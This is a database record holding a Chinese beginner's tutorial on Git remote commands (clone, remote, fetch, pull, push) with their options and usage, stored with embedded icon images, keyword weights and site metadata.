src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAG1BMVEUxAAAdHRseHhwfHx0fHx4gIB4hIR8iIiAjIyCMbVMLAAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfeBgwBJS9jlhpuAAAAcUlEQVQI122OOxKAIAwFQYfegGCLBdjKUfAGNNZ6A49uws/GVDtvdnbCGB6fWLux4SnSNtwZg5PRQLKIMjiIGg5EHD1xFiBVQV0OnsWWRuvKoNFcaXEyIc80UtPklKBOEZjPo6pfDN9nfO8obMd/oawvhiwOwjTYfd0AAAAASUVORK5CYII=" style="border: 0;" /> 开发者手册</a> \n</li>\n<li>付费支持：<a href="http://www.ruanyifeng.com/blog/2014/05/my_blog_book.html" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> 购买文集</a></li>\n<li>社交媒体：<a href="https://twitter.com/ruanyf" target="_blank"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAk1JREFUeNqsVc9rE0EU/mZ3dhPNJl2bVIk/Km09aFBE8GLvnrwJXvwLxIsgCP4Fnit6E8Gb0IMHwUsL9SSNgiAoooJIpE1Joo1h82uT7IxvxmRN3Q32kAdvdrI773vfe+/bDTu9WioDcDAda3Ja8piepQ1avCkCeny0Y+R9KenKwOmHHLvPaKn7AtVOoO8dOWDCMpg+41gMQv5FNEJACgoE8MsPNLDBhgfoutMOsJDmWLmU037C4TApciljwQ/kHoohQxV06+wMXNvE7WINuaSpvdYVKLgWnl3O4zAxU3Z1IYVGT+B5qYWV9z2kbQaT/cOwTsxOUUYF+mB5Dkmi8HG3h2q9hxsFNwRTdvQgxxnXRrMvIdkEhllis/qtiWuLDm4WZnBlPoWnXz28LHdw0uGR7m9Wu3j0qYGEubfn4UlBfXO4gTZltRNMg9w9f0i7kNFxllsBlS0x75gYfxyWTBUjT2W5CSMSPBrQuG21+hiMDS8CeCzF8eSLp13uQ3Ab1IqMFZN8tFHPmgOBF99bYP8Be1Xp6t7OJszJgKpPSiZvaj7uf2hguz2IBQuozDvFH6RDBjuK9wdQDvt0nMpW+8efGyh5UcAeZb2+UcHbnz5Jx4wdlp4yJYU3kLiQtfBwOYeLc8nIwfXtNu69q2Oz4mMxbemYOOOjKarhvq51KUjg3GwiFPIuvcNF6pnSnWK0lOEabNLgQh1aJFAhlGB9rG110B2+oyRNPc0sZbRNFltmLKDKqj4Qrm1ojzOxDz2pyPQ0P7CK4c40/wJ+CzAAGYrXsvfFXR4AAAAASUVORK5CYII=" style="border: 0;" /> twitter</a>，<a href="http://weibo.com/ruanyf" target="_blank"><img src="data:image/png;base64,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" style="border: 0;" /> weibo</a></li>\n<li>Feed订阅： <a href="http://www.ruanyifeng.com/feed.html" target="_blank"><img src="data:image/gif;base64,R0lGODlhFAAUANU2APV1GfmrePZ8IeR5VPq2ieNkLf7p3NpFJveCJ/NoFfibVPR1IexiJfvdzuZrNfXGuOhUEueTevaFOfzIpNxDGeZZJNU6IOubifiVTfOnid1aLuZpLOFSJf/28vJtIvGcefaLSd5kNu9iFv/z6//48//t4uFfLfNkCeJNGuGNc/rCof/+/PVxEeldI/V5KeKMbu9nIvB2OvzQtNxMKfOPXP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEAADYALAAAAAAUABQAAAb/QJstEjKZCsjCZsl0pIS2QWXaYsA8noVWIEAgFoNhhWNyMESi7Jbr/aZCFdRnZJAFJCwAt+vlOkwtEBk1hDUkExJ6bQJaGyYMLTQTDSOFHQF8jAseSFYiJwkuAQ2FE1xaHjBIMDAgARguJwABJIQTLJswDEgeIgSEJQQILAqVNQEiui1HHgkBhTUGCiwYtR0xLS0VJhtaEgoEBoQkGCfPNSoQY9xaCwAsCBPALgmkJA4cZN0CAAgY/PJqEIDwgVAECjM0bOAnwcAKGQJclKhRgoGDDjUeUDigkN8vQiBOfByAglSDAxw3IBCgYEU0FyJoEPpA4UGNDjMsaHDQR8EdPVYOMmQYQGHAhQgHLIRIsWAlgASsGMRBMWMGBQtYZ7yIsoBRKkhjOMxAiXJGGCEpHGxIYsSIhrcaQmy1EQQAOw==" style="border: 0;" /></a></li>\n\n</ul></div>        \n        <div><p><strong>[广告]</strong>　<a href="http://www.ruanyifeng.com/blog/www.greenvpn.org/1069807?utm_source=ruanyifeng.com" style="border: none;" target="_blank">GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。</a>\n</p>\n\n</div>', '2014-11-06 23:42:47', 2, '2014-11-24 09:06:54', '2014-06-12 05:22:22', 0, '[["git", 1.06220063311601], ["\\u5206\\u652f", 0.42161623358484496], ["origin", 0.4208719489704945], ["\\u8fdc\\u7a0b", 0.2991379456559262], ["master", 0.28058129931366305], ["\\u4e3b\\u673a", 0.27006342803045263], ["push", 0.21043597448524726], ["clone", 0.1903944531056999], ["\\u547d\\u4ee4", 0.18661991451808888], ["\\u672c\\u5730", 0.16808319178687342], ["remote", 0.16033217103637887], ["Git", 0.1503114103466052], ["\\u63a8\\u9001", 0.1399172958470243], ["pull", 0.13026988896705782], ["com", 0.10020760689773679], ["fetch", 0.10020760689773679], ["\\u8ffd\\u8e2a", 0.0931040971541492], ["\\u4e0a\\u9762", 0.08492501603021795], ["\\u9009\\u9879", 0.08272178222675607], ["jquery", 0.08016608551818943]]', NULL, NULL, 'Git是目前最流行的版本管理系统，学会Git几乎成了开发者的必备技能。 Git有很多优势，其中之一就是远程操作非常简便。本文详细介绍5个Git命令，它们的概念和用法，理解了这些内容，你就会完全掌握Git远程操作。 git clone git remote git fetch git pull git push 本文针对初级用户，从最简单的讲起，但是需要读者对Git的基本用法有所了解。同时，本文覆盖了上面5个命令的几乎所有的常用用法，所以对于熟练用户也有参考价值。 一、git clone 远程操作的第一步，通常是从远程主机克隆一个版本库，这时就要用到git clone命令。 $ git clone 比如，克隆jQuery的版本库。 $ git clone https://github.com/jquery/jquery.git 该命令会在本地主机生成一个目录，与远程主机的版本库同名。如果要指定不同的目录名，可以将目录名作为git clone命令的第二个参数。 $ git clone git clone支持多种协议，除了HTTP(s)以外，还支持SSH、Git、本地文件协议等，下面是一些例子。 $ git clone http[s]://example.com/path/to/repo.git/ $ git clone ssh://example.com/path/to/repo.git/ $ git clone git://example.com/path/to/repo.git/ $ git clone /opt/git/project.git $ git clone file:///opt/git/project.git $ git clone ftp[s]://example.com/path/to/repo.git/ $ git clone rsync://example.com/path/to/repo.git/ SSH协议还有另一种写法。 $ git clone [user@]example.com:path/to/repo.git/ 通常来说，Git协议下载速度最快，SSH协议用于需要用户认证的场合。各种协议优劣的详细讨论请参考官方文档。 二、git remote 为了便于管理，Git要求每个远程主机都必须指定一个主机名。git remote命令就用于管理主机名。 不带选项的时候，git remote命令列出所有远程主机。 $ git remote origin 使用-v选项，可以参看远程主机的网址。 $ git remote -v origin git@github.com:jquery/jquery.git (fetch) origin git@github.com:jquery/jquery.git (push) 上面命令表示，当前只有一台远程主机，叫做origin，以及它的网址。 克隆版本库的时候，所使用的远程主机自动被Git命名为origin。如果想用其他的主机名，需要用git clone命令的-o选项指定。 $ git clone -o jQuery https://github.com/jquery/jquery.git $ git remote jQuery 上面命令表示，克隆的时候，指定远程主机叫做jQuery。 git remote show命令加上主机名，可以查看该主机的详细信息。 $ git remote show git remote add命令用于添加远程主机。 $ git remote add git remote rm命令用于删除远程主机。 $ git remote rm git remote rename命令用于远程主机的改名。 $ git remote rename 三、git fetch 一旦远程主机的版本库有了更新（Git术语叫做commit），需要将这些更新取回本地，这时就要用到git fetch命令。 $ git fetch 上面命令将某个远程主机的更新，全部取回本地。 默认情况下，git fetch取回所有分支（branch）的更新。如果只想取回特定分支的更新，可以指定分支名。 $ git fetch 比如，取回origin主机的master分支。 $ git fetch origin master 所取回的更新，在本地主机上要用"远程主机名/分支名"的形式读取。比如origin主机的master，就要用origin/master读取。 git branch命令的-r选项，可以用来查看远程分支，-a选项查看所有分支。 $ git branch -r origin/master $ git branch -a * master remotes/origin/master 上面命令表示，本地主机的当前分支是master，远程分支是origin/master。 取回远程主机的更新以后，可以在它的基础上，使用git checkout命令创建一个新的分支。 $ git checkout -b newBrach origin/master 上面命令表示，在origin/master的基础上，创建一个新分支。 此外，也可以使用git merge命令或者git rebase命令，在本地分支上合并远程分支。 $ git merge origin/master # 或者 $ git rebase origin/master 上面命令表示在当前分支上，合并origin/master。 四、git pull git pull命令的作用是，取回远程主机某个分支的更新，再与本地的指定分支合并。它的完整格式稍稍有点复杂。 $ git pull : 比如，取回origin主机的next分支，与本地的master分支合并，需要写成下面这样。 $ git pull origin next:master 如果远程分支是与当前分支合并，则冒号后面的部分可以省略。 $ git pull origin next 上面命令表示，取回origin/next分支，再与当前分支合并。实质上，这等同于先做git fetch，再做git merge。 $ git fetch origin $ git merge origin/next 在某些场合，Git会自动在本地分支与远程分支之间，建立一种追踪关系（tracking）。比如，在git clone的时候，所有本地分支默认与远程主机的同名分支，建立追踪关系，也就是说，本地的master分支自动"追踪"origin/master分支。 Git也允许手动建立追踪关系。 git branch --set-upstream master origin/next 上面命令指定master分支追踪origin/next分支。 如果当前分支与远程分支存在追踪关系，git pull就可以省略远程分支名。 $ git pull origin 上面命令表示，本地的当前分支自动与对应的origin主机"追踪分支"（remote-tracking branch）进行合并。 如果当前分支只有一个追踪分支，连远程主机名都可以省略。 $ git pull 上面命令表示，当前分支自动与唯一一个追踪分支进行合并。 如果合并需要采用rebase模式，可以使用--rebase选项。 $ git pull --rebase : 五、git push git push命令用于将本地分支的更新，推送到远程主机。它的格式与git pull命令相仿。 $ git push : 注意，分支推送顺序的写法是<来源地>:<目的地>，所以git pull是<远程分支>:<本地分支>，而git push是<本地分支>:<远程分支>。 如果省略远程分支名，则表示将本地分支推送与之存在"追踪关系"的远程分支（通常两者同名），如果该远程分支不存在，则会被新建。 $ git push origin master 上面命令表示，将本地的master分支推送到origin主机的master分支。如果后者不存在，则会被新建。 如果省略本地分支名，则表示删除指定的远程分支，因为这等同于推送一个空的本地分支到远程分支。 $ git push origin :master # 等同于 $ git push origin --delete master 上面命令表示删除origin主机的master分支。 如果当前分支与远程分支之间存在追踪关系，则本地分支和远程分支都可以省略。 $ git push origin 上面命令表示，将当前分支推送到origin主机的对应分支。 如果当前分支只有一个追踪分支，那么主机名都可以省略。 $ git push 如果当前分支与多个主机存在追踪关系，则可以使用-u选项指定一个默认主机，这样后面就可以不加任何参数使用git push。 $ git push -u origin master 上面命令将本地的master分支推送到origin主机，同时指定origin为默认主机，后面就可以不加任何参数使用git push了。 不带任何参数的git push，默认只推送当前分支，这叫做simple方式。此外，还有一种matching方式，会推送所有有对应的远程分支的本地分支。Git 2.0版本之前，默认采用matching方法，现在改为默认采用simple方式。如果要修改这个设置，可以采用git config命令。 $ git config --global push.default matching # 或者 $ git config --global push.default simple 还有一种情况，就是不管是否存在对应的远程分支，将本地的所有分支都推送到远程主机，这时需要使用--all选项。 $ git push --all origin 上面命令表示，将所有本地分支都推送到origin主机。 如果远程主机的版本比本地版本更新，推送时Git会报错，要求先在本地做git pull合并差异，然后再推送到远程主机。这时，如果你一定要推送，可以使用--force选项。 $ git push --force origin 上面命令使用--force选项，结果导致远程主机上更新的版本被覆盖。除非你很确定要这样做，否则应该尽量避免使用--force选项。 最后，git push不会推送标签（tag），除非使用--tags选项。 $ git push origin --tags （完） 文档信息 版权声明：自由转载-非商用-非衍生-保持署名（创意共享3.0许可证） 发表日期： 2014年6月12日 更多内容： 档案 » 开发者手册 付费支持： 购买文集 社交媒体： twitter， weibo Feed订阅： [广告] GreenVPN是一款运营多年的绿色、稳定、安全的VPN产品，帮助您轻松浏览Google、‍Facebook、Youtube、Twitter等，使用简单，手机电脑全平台支持，可免费试用，值得推荐。', 1, NULL, NULL);
